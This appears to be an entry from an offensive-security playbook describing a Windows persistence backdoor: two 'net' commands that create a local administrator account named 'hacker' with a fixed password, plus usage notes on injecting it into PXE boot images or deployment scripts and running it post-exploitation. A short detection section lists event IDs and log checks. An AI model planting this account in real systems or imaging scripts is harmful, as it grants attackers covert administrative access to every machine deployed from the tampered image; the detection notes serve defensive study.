---
id: fc8fbec2-bbc7-49cd-a45e-77c2a33aea18
name: add-backdoor-local-admin-windows
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:08.387844+00:00'
updated_at: '2023-04-10T20:36:00.790175+00:00'
platforms:
  - Windows
tags:
  - persistence
  - backdoor
validated: true
---

# Add Backdoor Local Admin Windows

## Code

```powershell
net user hacker Password123! /add
net localgroup administrators /add hacker
```

## Description

This code snippet creates a backdoor local administrator account named 'hacker' with password 'Password123!' and adds it to the administrators group. It is intended as a payload to inject into modified PXE boot images or deployment scripts for persistent access during automated imaging processes.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| hacker | Username for the backdoor account | hacker |
| Password123! | Password for the account | Password123! |

## Usage

Embed this in a startup script within a WIM file (e.g., via DISM mount and edit of LiteTouchPE.wim) or run it post-exploitation using extracted deployment credentials. Execute in an elevated context during PXE boot to ensure it runs before user login.

## Detection

- Monitor for new local accounts via Event ID 4720 (user creation) and 4732 (group addition).
- Check PowerShell or CMD logs for 'net user' and 'net localgroup' invocations.
- Scan for anomalous local admins with tools like LAPS reporting.
- Network: Unusual TFTP traffic preceding account changes.

## Related

- [[procedures/pxe-boot-image-attack-local-admin-hijack]]
- [[techniques/Account Manipulation|T1098]]
